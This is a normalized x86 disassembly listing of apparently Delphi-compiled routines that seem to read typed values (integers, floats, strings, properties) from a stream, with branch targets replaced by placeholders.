mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + ebx * 4 ]
mov ax [ edi + 0x1c ]
or ax [ ebp - 0x2 ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x1c ] ax
jmp r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_41f4c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x1
jne r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov al 0x1
pop ebp
retn
sub_41f4e8
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
call sub_402844
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_41f4c8
pop ecx
test al al
je r-xdata
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
xor edx edx
call sub_420f18
call sub_402844
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ esi ]
call sub_403390
sub_41f548
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41f62e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4210b8
mov ebx eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x6a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov ecx ebx
mov eax [ esi + 0x6c ]
call [ esi + 0x68 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
test [ eax - 0x9 ] 0x4
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
push ebp
push sub_41f602
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or edx 0xffffffff
mov ebx [ eax ]
call [ ebx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41f633
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41f4e8
pop ecx
test al al
jne r-xdata
call sub_403bd8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403b84
sub_41f658
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41f6d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_40358c
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_41b014
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41f6f8
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41f773
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4210b8
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_40358c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41f778
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41f4e8
pop ecx
test al al
jne r-xdata
call sub_403bd8
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403b84
sub_41f79c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41f9bd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_420a48
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_420a48
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41f98d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41f94b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41f3e8
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41f460
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41f548
pop ecx
push ebp
call sub_41f6f8
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41f658
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403c08
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41f460
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41f460
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9c4
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4054a4
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_40358c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41b6b0
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41f3ac
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41b4f8
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41f3ac
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41b4f8
sub_41f950
push ebp
call sub_41f4c8
pop ecx
test al al
je r-xdata
call sub_403b84
call sub_403bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403390
sub_41f9d8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41fa48
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41fa33
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41fa48
mov eax [ ebp - 0x4 ]
call sub_41ef98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f0dc
retn
sub_41fa48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee80
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ff50
mov eax [ ebp - 0x4 ]
call sub_41fdec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_40358c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41fb0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_40358c
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ee80
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41f79c
mov eax [ ebp - 0x4 ]
call sub_41fdec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fb11
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41fb18
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_420c24
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41fda0
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41f1e8
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41fb5c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_420c24
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41fda0
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f1e8
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41fba0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_420c24
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41fda0
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41f1e8
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41fbf0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_420c24
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41fda0
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41f1e8
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41fc34
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_420c24
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41ecc0
mov al [ eax + lookup_table_41fc5b ]
jmp [ eax * 4 + jump_table_41fc69 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41f1e8
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_404210
mov eax esi
call j_sub_4045ec#2
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41f1e8
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404174
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404174
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404174
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404174
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41fd34
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_420c24
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41f1e8
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41f1e8
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41f1e8
jmp r-xdata
jmp r-xdata
call sub_41ecc0
sub_41fda0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41f1c4
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41fd34
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_420c24
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41f1e8
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41fdf4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41f1c4
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_420c24
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41fd34
mov [ edi ] eax
sub_41fe34
push ebp
mov ebp esp
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41ff25
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_404120
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_4041b8
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd3c
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ff2c
lea eax [ ebp - 0x4 ]
call sub_404120
retn
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4032e0
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404384
sub_41ff50
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_420120
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_40399c#5
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_420a48
xor edx edx
push ebp
push j_sub_40399c#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4043e0
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_404640
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4035d0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_41755c
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4035d0
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_41755c
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4202d4
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41f1d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41f1d4
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_40351c
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_417688
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41ff34
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420127
lea eax [ ebp - 0x8 ]
call sub_404120
retn
mov edi ebx
jmp r-xdata
sub_4200da
add [ eax ] eax
add [ eax ] al
nop
je r-xdata
add dh ah
add [ edx ] al
mov ebx eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403b84
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403bd8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420127
lea eax [ ebp - 0x8 ]
call sub_404120
retn
sub_420130
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_41aebc
mov ebx eax
test ebx ebx
je r-xdata
call sub_41ecc0
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4176fc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_420178
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e754
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41b4f8
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4201b8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_420207
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42133c
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4181e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42020e
lea eax [ ebp - 0x10 ]
call sub_40f638
retn
sub_420214
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_4202c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41f1c4
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41fc34
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e754
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41b4f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420c24
lea eax [ ebp - 0x4 ]
call sub_405b50
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_418380
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4202cd
lea eax [ ebp - 0x8 ]
call sub_404120
lea eax [ ebp - 0x4 ]
call sub_405b50
retn
sub_4202d4
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4205cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4205d6
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_404144
lea eax [ ebp - 0x24 ]
call sub_40482c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_404144
retn
jmp [ eax * 4 + jump_table_420364 ]
mov eax [ rw-data ]
call sub_41eca8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417688
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f1c4
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f284
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4176fc
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41fc34
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_4174f8
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4176fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fb18
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417f98
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_420a84
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417c98
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_420b40
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417dac
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_420968
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4176fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f1c4
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41f1c4
cmp al 0xd
jne r-xdata
push ebp
call sub_4201b8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fda0
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4182c4
jmp r-xdata
push ebp
call sub_420214
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417688
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41fd34
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4176fc
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41fc34
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_420130
jmp r-xdata
